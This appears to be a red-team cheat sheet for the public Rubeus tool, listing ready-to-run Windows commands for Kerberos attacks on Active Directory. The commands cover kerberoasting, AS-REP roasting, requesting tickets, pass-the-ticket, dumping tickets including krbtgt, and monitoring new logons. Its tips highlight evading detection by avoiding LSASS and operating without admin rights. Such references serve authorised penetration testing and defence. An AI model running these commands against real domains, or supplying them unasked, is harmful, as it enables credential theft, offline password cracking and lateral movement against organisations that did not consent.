# Rubeus

**Type:** C# Tool
**Purpose:** Kerberos abuse and manipulation
**Platform:** Windows
**Tags:** #windows #kerberos #active-directory #post-exploitation #tickets

---

## Quick Reference

```
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep-hashes.txt

# Request TGT
Rubeus.exe asktgt /user:username /password:password /domain:company.com

# Pass-the-Ticket
Rubeus.exe ptt /ticket:base64-ticket

# Dump tickets
Rubeus.exe dump

# Monitor for new logons
Rubeus.exe monitor /interval:10
```

---

## Kerberoasting

```
# Kerberoast all SPNs
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Specific user
Rubeus.exe kerberoast /user:serviceaccount

# Target specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/server.company.com
```

---

## AS-REP Roasting

```
# Find and roast AS-REP roastable users
Rubeus.exe asreproast /outfile:asrep.txt

# Specific user
Rubeus.exe asreproast /user:username
```

---

## Ticket Operations

```
# Request TGT
Rubeus.exe asktgt /user:admin /password:pass /domain:company.com

# Request TGS
Rubeus.exe asktgs /service:cifs/server.company.com /ticket:base64-tgt

# Pass-the-Ticket
Rubeus.exe ptt /ticket:base64-ticket

# Dump all tickets
Rubeus.exe dump /service:krbtgt

# Purge tickets
Rubeus.exe purge
```

---

## Pro Tips

💡 **Pure Kerberos**: Doesn't touch LSASS (stealthier than mimikatz)
💡 **No Admin Required**: Most operations don't need elevated privileges
💡 **Kerberoasting**: Offline cracking of service account passwords
💡 **AS-REP**: Targets accounts without Kerberos pre-auth
💡 **Monitoring**: Can monitor for new TGTs in real-time

---

## Note

Windows AD tool, included for comprehensive coverage. For Azure Kerberos operations, see AADInternals.

---

## Resources

- GitHub: https://github.com/GhostPack/Rubeus
- Author: @harmj0y (Will Schroeder) / GhostPack
